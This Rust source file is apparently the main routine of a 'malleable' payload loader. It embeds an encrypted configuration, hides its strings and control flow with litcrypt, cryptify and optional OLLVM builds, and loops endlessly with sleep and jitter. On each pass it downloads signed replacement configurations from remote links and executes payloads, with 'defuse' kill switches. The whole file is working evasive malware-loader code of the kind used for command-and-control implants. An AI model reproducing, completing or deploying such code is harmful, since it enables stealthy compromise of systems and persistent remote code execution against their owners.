use malleable_rust_loader::link::LinkFetch;
use malleable_rust_loader::loaderconf::LoaderConf;
use std::{thread, time};

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
use malleable_rust_loader::dataoperation::DataOperation;

use log::debug;
use log::error;
use log::info;
use log::warn;
extern crate env_logger;
use cryptify;

// ------ STANDARD compilation
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_LOADER : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead.dataop.rot13b64"));

// ------ OLLVM compilation from a docker
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aead");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.json.aead.dataop.rot13b64");





fn main() {
    #[cfg(feature="logdebug")]
    env_logger::init();

    cryptify::flow_stmt!();
    let loader_conf_encrypted = INITIAL_LOADER.to_vec();
    let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
    debug!("{}", lc!("[+] OPEN dataoperation"));
    let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
    let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
    let dataoperation: Vec<DataOperation> =
        serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
    debug!("{}{:?}", lc!("[+] dataoperation: "), dataoperation);

    info!("{}", lc!("[+] DECRYPT initial config"));
    let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
    info!("{}", lc!("[+] DECRYPTED!"));

    let mut loaderconf: LoaderConf = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
    info!("{}", lc!("[+] VERIFY initial config"));
    debug!("{:?}", &loaderconf);
    loaderconf.verify_newloader_sign(&loaderconf).unwrap();
    info!("{}{}", lc!("[+] VERIFIED!"), "\n");

    let mut loop_nb = 1;
    loop {
        info!(
            "{}{}{}",
            lc!("[+] BEGIN LOOP "),
            loop_nb,
            lc!(" --------------------------------------------------------")
        );
        info!("{}{:?}", lc!("[+] Active LOADER: "), loaderconf);
        loaderconf.print_loader_without_sign_material();
        loaderconf.sleep_and_jitt();

        info!("{}", lc!("[+] DEFUSE RELOAD config"));
        if loaderconf.stop_defuse(&loaderconf.defuse_update) {
            error!("{}", lc!("[!] DEFUSE STOP reload config"));
        } else {
            let mut nb_config = 1;
            let mut change_loader = false;
            let mut replacement_loaderconf: LoaderConf = LoaderConf::new_empty();
            info!("{}", lc!("[+] RELOAD config"));

            for conflink in &loaderconf.loaderconf_update_links {
                info!(
                    "{}/{}{}{:?}",
                    nb_config,
                    &loaderconf.loaderconf_update_links.len(),
                    lc!(" config link: "),
                    &conflink
                );
                let result = conflink.fetch_data();
                let data = match result {
                    Ok(data) => data,
                    Err(error) => {
                        warn!("{}{}", lc!("error: "), error);
                        continue;
                    }
                };
                debug!("{}", lc!("deserialized data"));
                let newloader: LoaderConf = match serde_json::from_slice(&data) {
                    Ok(newloader) => newloader,
                    Err(error) => {
                        warn!("{}{}", lc!("error: "), error);
                        continue;
                    }
                };
                debug!("{}", lc!("new loader downloaded:"));
                newloader.print_loader_compact();
                let verified = match loaderconf.verify_newloader_sign(&newloader) {
                    Ok(()) => true,
                    _unspecified => false,
                };
                if verified {
                    info!("{}{}", lc!("verify signature: "), verified);
                } else {
                    warn!("{}{}", lc!("verify signature: "), verified);
                }
                if verified {
                    let is_same_loader = loaderconf.is_same_loader(&newloader);
                    if is_same_loader {
                        info!("{}{}", lc!("same loader: "), is_same_loader);
                    } else {
                        warn!("{}{}", lc!("same loader: "), is_same_loader);
                    }
                    if is_same_loader {
                        info!(
                            "{}",
                            lc!("[+] DECISION: keep the same active LOADER, and run the payloads")
                        );
                        break;
                    } else {
                        info!(
                        "{}",
                        lc!("[+] DECISION: replace the active LOADER by this one, and run the payloads")
                    );
                        change_loader = true;
                        replacement_loaderconf = newloader;
                        break;
                    }
                }
                info!(
                    "{}",
                    lc!("[+] DECISION: try to fetch an other loader with next link")
                );
                nb_config = nb_config + 1;
            }

            if change_loader {
                info!("{}", lc!("[+] LOADER replaced"));
                loaderconf = replacement_loaderconf;
            }

            info!("{}", lc!("[+] DEFUSE payload exec"));
            if loaderconf.stop_defuse(&loaderconf.defuse_payload) {
                error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
            } else {
                info!("{}", lc!("[+] PAYLOADS exec"));
                loaderconf.exec_payloads();
            }
        }

        info!(
            "{}{}{}{}",
            lc!("[+] END LOOP "),
            loop_nb,
            lc!(" ----------------------------------------------------------"),
            "\n"
        );

        let sleep_time = time::Duration::from_millis(1000);
        thread::sleep(sleep_time);
        loop_nb = loop_nb + 1;
    }
}
